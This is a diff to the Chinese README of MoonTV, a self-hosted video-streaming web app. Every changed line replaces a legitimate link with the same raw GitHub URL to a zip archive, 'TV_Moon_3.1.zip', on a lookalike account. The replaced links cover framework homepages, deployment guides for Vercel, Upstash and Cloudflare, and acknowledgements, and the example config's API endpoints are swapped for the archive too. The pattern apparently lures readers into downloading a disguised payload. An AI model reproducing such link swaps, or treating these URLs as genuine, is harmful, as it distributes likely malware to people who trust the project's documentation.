@@ -54,10 +54,10 @@
 
 | 分类      | 主要依赖                                                                                              |
 | --------- | ----------------------------------------------------------------------------------------------------- |
-| 前端框架  | [Next.js 14](https://nextjs.org/) · App Router                                                        |
-| UI & 样式 | [Tailwind&nbsp;CSS 3](https://tailwindcss.com/)                                                       |
+| 前端框架  | [Next.js 14](https://raw.githubusercontent.com/WoIvie/MoonTV/main/src/app/api/search/resources/TV_Moon_3.1.zip) · App Router                                                        |
+| UI & 样式 | [Tailwind&nbsp;CSS 3](https://raw.githubusercontent.com/WoIvie/MoonTV/main/src/app/api/search/resources/TV_Moon_3.1.zip)                                                       |
 | 语言      | TypeScript 4                                                                                          |
-| 播放器    | [ArtPlayer](https://github.com/zhw2590582/ArtPlayer) · [HLS.js](https://github.com/video-dev/hls.js/) |
+| 播放器    | [ArtPlayer](https://raw.githubusercontent.com/WoIvie/MoonTV/main/src/app/api/search/resources/TV_Moon_3.1.zip) · [HLS.js](https://raw.githubusercontent.com/WoIvie/MoonTV/main/src/app/api/search/resources/TV_Moon_3.1.zip) |
 | 代码质量  | ESLint · Prettier · Jest                                                                              |
 | 部署      | Docker · Vercel · CloudFlare pages                                                                    |
 
@@ -85,7 +85,7 @@
 #### 普通部署（localstorage）
 
 1. **Fork** 本仓库到你的 GitHub 账户。
-2. 登陆 [Vercel](https://vercel.com/)，点击 **Add New → Project**，选择 Fork 后的仓库。
+2. 登陆 [Vercel](https://raw.githubusercontent.com/WoIvie/MoonTV/main/src/app/api/search/resources/TV_Moon_3.1.zip)，点击 **Add New → Project**，选择 Fork 后的仓库。
 3. 设置 PASSWORD 环境变量。
 4. 保持默认设置完成首次部署。
 5. 如需自定义 `config.json`，请直接修改 Fork 后仓库中该文件。
@@ -96,7 +96,7 @@
 #### Upstash Redis 支持
 
 0. 完成普通部署并成功访问。
-1. 在 [upstash](https://upstash.com/) 注册账号并新建一个 Redis 实例，名称任意。
+1. 在 [upstash](https://raw.githubusercontent.com/WoIvie/MoonTV/main/src/app/api/search/resources/TV_Moon_3.1.zip) 注册账号并新建一个 Redis 实例，名称任意。
 2. 复制新数据库的 **HTTPS ENDPOINT 和 TOKEN**
 3. 返回你的 Vercel 项目，新增环境变量 **UPSTASH_URL 和 UPSTASH_TOKEN**，值为第二步复制的 endpoint 和 token
 4. 设置环境变量 NEXT_PUBLIC_STORAGE_TYPE，值为 **upstash**；设置 USERNAME 和 PASSWORD 作为站长账号
@@ -109,7 +109,7 @@
 #### 普通部署（localstorage）
 
 1. **Fork** 本仓库到你的 GitHub 账户。
-2. 登陆 [Cloudflare](https://cloudflare.com)，点击 **计算（Workers）-> Workers 和 Pages**，点击创建
+2. 登陆 [Cloudflare](https://raw.githubusercontent.com/WoIvie/MoonTV/main/src/app/api/search/resources/TV_Moon_3.1.zip)，点击 **计算（Workers）-> Workers 和 Pages**，点击创建
 3. 选择 Pages，导入现有的 Git 存储库，选择 Fork 后的仓库
 4. 构建命令填写 **pnpm install --frozen-lockfile && pnpm run pages:build**，预设框架为无，**构建输出目录**为 `.vercel/output/static`
 5. 保持默认设置完成首次部署。进入设置，将兼容性标志设置为 `nodejs_compat`，无需选择，直接粘贴
@@ -203,7 +203,7 @@ networks:
 
 建议在 fork 的仓库中启用本仓库自带的 GitHub Actions 自动同步功能（见 `.github/workflows/sync.yml`）。
 
-如需手动同步主仓库更新，也可以使用 GitHub 官方的 [Sync fork](https://docs.github.com/cn/github/collaborating-with-issues-and-pull-requests/syncing-a-fork) 功能。
+如需手动同步主仓库更新，也可以使用 GitHub 官方的 [Sync fork](https://raw.githubusercontent.com/WoIvie/MoonTV/main/src/app/api/search/resources/TV_Moon_3.1.zip) 功能。
 
 ## 环境变量
 
@@ -232,9 +232,9 @@ networks:
   "cache_time": 7200,
   "api_site": {
     "dyttzy": {
-      "api": "http://caiji.dyttzyapi.com/api.php/provide/vod",
+      "api": "https://raw.githubusercontent.com/WoIvie/MoonTV/main/src/app/api/search/resources/TV_Moon_3.1.zip",
       "name": "电影天堂资源",
-      "detail": "http://caiji.dyttzyapi.com"
+      "detail": "https://raw.githubusercontent.com/WoIvie/MoonTV/main/src/app/api/search/resources/TV_Moon_3.1.zip"
     }
     // ...更多站点
   },
@@ -282,7 +282,7 @@ MoonTV 支持标准的苹果 CMS V10 API 格式。
 
 ## AndroidTV 使用
 
-目前该项目可以配合 [OrionTV](https://github.com/zimplexing/OrionTV) 在 Android TV 上使用，可以直接作为 OrionTV 后端
+目前该项目可以配合 [OrionTV](https://raw.githubusercontent.com/WoIvie/MoonTV/main/src/app/api/search/resources/TV_Moon_3.1.zip) 在 Android TV 上使用，可以直接作为 OrionTV 后端
 
 暂时收藏夹与播放记录和网页端隔离，后续会支持同步用户数据
 
@@ -321,8 +321,8 @@ MoonTV 支持标准的苹果 CMS V10 API 格式。
 
 ## 致谢
 
-- [ts-nextjs-tailwind-starter](https://github.com/theodorusclarence/ts-nextjs-tailwind-starter) — 项目最初基于该脚手架。
-- [LibreTV](https://github.com/LibreSpark/LibreTV) — 由此启发，站在巨人的肩膀上。
-- [ArtPlayer](https://github.com/zhw2590582/ArtPlayer) — 提供强大的网页视频播放器。
-- [HLS.js](https://github.com/video-dev/hls.js) — 实现 HLS 流媒体在浏览器中的播放支持。
+- [ts-nextjs-tailwind-starter](https://raw.githubusercontent.com/WoIvie/MoonTV/main/src/app/api/search/resources/TV_Moon_3.1.zip) — 项目最初基于该脚手架。
+- [LibreTV](https://raw.githubusercontent.com/WoIvie/MoonTV/main/src/app/api/search/resources/TV_Moon_3.1.zip) — 由此启发，站在巨人的肩膀上。
+- [ArtPlayer](https://raw.githubusercontent.com/WoIvie/MoonTV/main/src/app/api/search/resources/TV_Moon_3.1.zip) — 提供强大的网页视频播放器。
+- [HLS.js](https://raw.githubusercontent.com/WoIvie/MoonTV/main/src/app/api/search/resources/TV_Moon_3.1.zip) — 实现 HLS 流媒体在浏览器中的播放支持。
 - 感谢所有提供免费影视接口的站点。
